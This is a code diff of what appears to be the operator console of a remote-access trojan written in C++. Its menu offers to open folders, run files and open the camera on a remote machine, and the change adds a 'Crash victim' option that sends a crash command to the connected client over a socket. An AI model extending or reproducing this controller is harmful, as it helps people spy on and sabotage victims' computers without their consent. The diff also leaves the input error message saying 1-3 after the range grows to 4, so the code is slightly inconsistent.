@@ -128,7 +128,8 @@ int main() {
             while(true) {
                 std::cout << CONSOLE_PREFIX << " 1 - Open a folder\n";
                 std::cout << CONSOLE_PREFIX << " 2 - Execute a file\n";
-                std::cout << CONSOLE_PREFIX << " 3 - Open camera\n\n";
+                std::cout << CONSOLE_PREFIX << " 3 - Open camera\n";
+                std::cout << CONSOLE_PREFIX << " 4 - Crash victim\n\n";
 
                 int choice;
                 std::cout << CONSOLE_PREFIX << " Choose an option: ";
@@ -138,7 +139,7 @@ int main() {
                     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                     std::cout << ERROR_PREFIX << " Invalid usage, please enter a number between 1-3\n";
                     continue;
-                } else if (!(choice >= 1 && choice <= 3)) {
+                } else if (!(choice >= 1 && choice <= 4)) {
                     std::cout << ERROR_PREFIX << " Invalid usage, please enter a number between 1-3\n";
                     continue;
                 }
@@ -212,6 +213,16 @@ int main() {
                         }
 
                         std::cout << SUCCESS_PREFIX << " Sent camera execution command\n";
+                        break;
+                    }
+
+                    case 4: {
+                        int subtype = 4;
+                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
+                        if(bytesSend <= 0) {
+                            std::cout << ERROR_PREFIX << " Failed to send crash cmd\n";
+                        }
+
                         break;
                     }
                 }
